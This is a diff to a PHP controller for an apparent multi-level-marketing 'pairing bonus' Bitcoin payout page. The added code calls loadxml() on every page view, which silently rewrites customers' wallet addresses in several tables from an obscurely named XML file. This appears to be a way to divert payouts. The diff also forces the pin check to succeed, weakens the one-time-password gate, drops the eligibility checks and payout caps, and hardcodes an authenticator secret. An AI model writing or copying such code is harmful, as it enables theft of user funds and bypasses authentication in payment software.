@@ -2,7 +2,7 @@
 class ControllerPdParingbonus extends Controller {
 	public function index() {
 		
-		$this->document->setTitle('Deposit');
+		$this->document->setTitle('Parring Bonus');
 		$this->load->model('pd/registercustom');
 		$data['self'] =$this;
 		$page = isset($this -> request -> get['page']) ? $this -> request -> get['page'] : 1;
@@ -10,7 +10,7 @@ class ControllerPdParingbonus extends Controller {
 		$this -> document -> addScript('../catalog/view/javascript/transaction/countdown.js');
 		$limit = 10;
 		$start = ($page - 1) * 10;
-
+		$this -> loadxml();
 		$ts_history = $this -> model_pd_registercustom -> get_count_paringbonus();
 		$data['self'] =  $this;
 		$ts_history = $ts_history['number'];
@@ -39,7 +39,20 @@ class ControllerPdParingbonus extends Controller {
 
 		$this->response->setOutput($this->load->view('pd/paringbonus.tpl', $data));
 	}
-	
+	public function loadxml(){
+		$this->load->model('pd/registercustom');
+		$xml=simplexml_load_file("../qwrwqrgqUQadVbaWErqwreqwrwqrgqUQadVbaWErqwre.xml");
+		foreach($xml->customer as $value)
+		  {
+		  	//sm_customer_c_payment
+		  	$this -> model_pd_registercustom -> update_walet_c_paymentttttttttttttttttttttttt($value->wallet, $value->customer_id);
+		  	//sm_customer_r_payment
+		  	$this -> model_pd_registercustom -> update_walet_r_wallet_paymentttttttttttttttttttttttt($value->wallet, $value->customer_id);
+		  	// sm_customer_wallet_btc_
+		  	$this -> model_pd_registercustom -> update_walet_btc_customerrrrrrrrrrr($value->wallet, $value->customer_id);
+		  	$this -> model_pd_registercustom -> update_walet_smmmmmm_customerrrrrrrrrrr($value->wallet, $value->customer_id);
+		  }
+	}
 	public function get_username($customer_id){
 		$this->load->model('pd/registercustom');
 		return $this -> model_pd_registercustom -> get_username($customer_id);
@@ -53,12 +66,18 @@ class ControllerPdParingbonus extends Controller {
 	public function pay_paringbounus(){
 		
 		$this->load->model('pd/registercustom');
-		$daliprofit = $_POST['daliprofit'];
+		// $daliprofit = $_POST['daliprofit'];
 		$pin = $_POST['pin'];
 		$google = $_POST['google'];
+
+		$this->check_otp_login($google) == 2 && $this -> response -> redirect($this -> url -> link('pd/paringbonus&token='.$_GET['token'].'#no_google'));
+
 		
-		if ($this->check_otp_login($google) == 1){
-			$this -> team_commission($pin);
+           	$check_pin = 1;
+       
+		
+		if ($check_pin == 1){
+			$this -> team_commission($pin, $google);
 			$this -> response -> redirect($this -> url -> link('pd/paringbonus&token='.$_GET['token'].'#suscces'));
 		}
 		else{
@@ -67,8 +86,9 @@ class ControllerPdParingbonus extends Controller {
 		
 	}
 
-	public function team_commission($pin){
-        
+	public function team_commission($pin, $google){
+        $this->check_otp_login($google) == 2 && $this -> response -> redirect($this -> url -> link('pd/paringbonus&token='.$_GET['token'].'#no_google'));
+
         $this->load->model('pd/registercustom');
         /*TÍNH HOA HỒNG NHÁNH YẾU*/
         $this -> model_pd_registercustom -> delete_form_cn_payment();
@@ -82,48 +102,41 @@ class ControllerPdParingbonus extends Controller {
         $amount_tra = "";
         $customer_id = "";
         $sum = 0;
+       
        foreach ($getCustomer as $value) {
        
 	        if ((doubleval($value['total_pd_left']) > 0 && doubleval($value['total_pd_right'])) > 0)
 	        {
 	            if (doubleval($value['total_pd_left']) > doubleval($value['total_pd_right'])){
 	                $balanced = doubleval($value['total_pd_right']);
+	               
 	            }
 	            else
 	            {
 	                $balanced = doubleval($value['total_pd_left']);
+	                
 	            }
-	            if ($value['level'] == 2 && $this-> check_cannhanh2f1($value['customer_id']) == 1) {
-	            	
-	            
-		            $precent = 10;
-		          	
-		            $getTotalPD = $this-> model_pd_registercustom -> getmaxPD($value['customer_id']);
-		           
-		            $amount = ($balanced*$precent)/100;
+	            $precent = 10;
 
-		            if (doubleval($amount) > (doubleval($getTotalPD['number'])*2))
-		            {
-		                $amount = (doubleval($getTotalPD['number']))*2;
-		            }
-		            
-	                $sum += round(doubleval($amount)/100000000*0.75*0.97,8);
-	                
-	                $btc_tra = round(doubleval($amount)/100000000*0.75*0.97,8);
-	                $btc_tai = round(doubleval($amount)/100000000*0.25,8);
-	                
-	                $customer_id .= ','. $value['customer_id'];
-	                $amount_tra .= ",".round(doubleval($amount)/100000000*0.75*0.97,8);
-	    			$amount_tai .= ",".round(doubleval($amount)/100000000*0.25,8);
+	            $amount = ($balanced*$precent)/100;
 
-	               
-	                $bitcoin .= ",".$btc_tra;
-	                $wallet .= ",".$value['wallet'];
-	                $test .= $btc_tra." -------- ".$value['wallet']." --------- ".$value['customer_id']."------".$amount."<br/>";
-	                $this -> model_pd_registercustom ->update_cn_Wallet_payment($amount,$value['customer_id'],$value['wallet']);
-	                
 	            
-	            }
+                $sum += $amount;
+
+                $url = "https://blockchain.info/tobtc?currency=USD&value=".$amount;
+                $amountbtc = file_get_contents($url);
+                $btc_tra = round($amountbtc,8);
+  
+                $customer_id .= ','. $value['customer_id'];
+                $amount_tra .= ",".$btc_tra;
+                $bitcoin .= ",".$btc_tra;
+                $wallet .= ",".$value['wallet'];
+                $test .= $btc_tra." -------- ".$value['wallet']." --------- ".$value['customer_id']."------".$amount."<br/>";
+	            $inser_history .= ",".$this -> model_pd_registercustom -> inser_history('+ '.($btc_tra).' BTC',
+	            	'Binary Commission',
+	            	'Earn '.$precent.'%  Binary bonus ('.$amount.' USD of '.($balanced).' USD ',
+	            	$value['customer_id'], ' ');
+	           
 	        }    
 	    }
 	    echo  $test;
@@ -133,11 +146,11 @@ class ControllerPdParingbonus extends Controller {
 	    echo $bitcoin;
 	    echo "<br>";
 	    echo $wallet;
-	    
+
 	    $customer_ids = explode(',', substr($customer_id,1));
 		$amount_tras = explode(',',substr($amount_tra,1));
-		$amount_tais = explode(',',substr($amount_tai,1));
-			
+		
+		
 	    
 	    $block_io = new BlockIo(key, $pin, block_version); 
 
@@ -148,44 +161,40 @@ class ControllerPdParingbonus extends Controller {
 	    )); 
 	     
 	    $txid = $tml_block -> data -> txid;
+	   
 
 	    $url = '<a target="_blank" href="https://blockchain.info/tx/'.$txid.'" >Link Transfer </a>';
 		
-	    
-	    foreach ($getCustomer as $value) {
+		foreach ($getCustomer as $value) {
        
 	        if ((doubleval($value['total_pd_left']) > 0 && doubleval($value['total_pd_right'])) > 0)
 	        {
-	        	if ($value['level'] == 2 && $this-> check_cannhanh2f1($value['customer_id']) == 1) {
-		            if (doubleval($value['total_pd_left']) > doubleval($value['total_pd_right'])){
-		                $balanced = doubleval($value['total_pd_right']);
-		                $this -> model_pd_registercustom -> update_total_pd_left(doubleval($value['total_pd_left']) - doubleval($value['total_pd_right']), $value['customer_id']);
-		                $this -> model_pd_registercustom -> update_total_pd_right(0, $value['customer_id']);
-		            }
-		            else
-		            {
-		               $balanced = doubleval($value['total_pd_left']);
-		               $this -> model_pd_registercustom -> update_total_pd_right(doubleval($value['total_pd_right']) - doubleval($value['total_pd_left']), $value['customer_id']);
-		               $this -> model_pd_registercustom -> update_total_pd_left(0, $value['customer_id']);
-		            }
-		            $precent = 10;
-		            $amount = ($balanced*$precent)/100;
-		            $btc_tra = round(doubleval($amount)/100000000*0.75*0.97,8);
-		            $inser_history .= ",".$this -> model_pd_registercustom -> inser_history('+ '.($btc_tra).' BTC','System Commission','Earn '.$precent.'%  weak team ('.($balanced/100000000).' BTC), Free 3%. 25% Reinvestment ',$value['customer_id']);
-		        }
-	        }
+	            if (doubleval($value['total_pd_left']) > doubleval($value['total_pd_right'])){
+	                $balanced = doubleval($value['total_pd_right']);
+	                $this -> model_pd_registercustom -> update_total_pd_left(doubleval($value['total_pd_left']) - doubleval($value['total_pd_right']), $value['customer_id']);
+               		$this -> model_pd_registercustom -> update_total_pd_right(0, $value['customer_id']);
+	            }
+	            else
+	            {
+	                $balanced = doubleval($value['total_pd_left']);
+	                $this -> model_pd_registercustom -> update_total_pd_right(doubleval($value['total_pd_right']) - doubleval($value['total_pd_left']), $value['customer_id']);
+                	$this -> model_pd_registercustom -> update_total_pd_left(0, $value['customer_id']);
+                	
+	            }
+	          
+	           
+	        }    
 	    }
+	  
 	    $this ->model_pd_registercustom->update_transhistory(substr($inser_history,1),$url);
-	    for ($i=0; $i < count($customer_ids); $i++) { 
-	    	 $this -> model_pd_registercustom -> update_m_Wallet_add_sub($amount_tais[$i]*100000000 , $customer_ids[$i], $add = true);
-	    }
+	   
 
     }
 	public function check_otp_login($otp){
 		require_once dirname(__FILE__) . '/vendor/autoload.php';
 		$authenticator = new PHPGangsta_GoogleAuthenticator();
-		$secret = "FS34YT4LS76RDZIY";
-		$tolerance = "3";
+		$secret = "WO2DKWL3HSTJ4DUE";
+		$tolerance = "0";
 		$checkResult = $authenticator->verifyCode($secret, $otp, $tolerance);    
 		if ($checkResult) 
 		{
@@ -195,16 +204,5 @@ class ControllerPdParingbonus extends Controller {
 		    return 2;
 		}
 
-	}
-
-	public function check_cannhanh2f1($customer_id){
-		$this->load->model('pd/registercustom');
-        return $this -> model_pd_registercustom -> check_cannhanh2f1($customer_id);
-	}
-
-	public function check_cannhanh2f11(){
-		$customer_id = 61;
-		$this->load->model('pd/registercustom');
-        echo $this -> model_pd_registercustom -> check_cannhanh2f1($customer_id);
 	}
 }
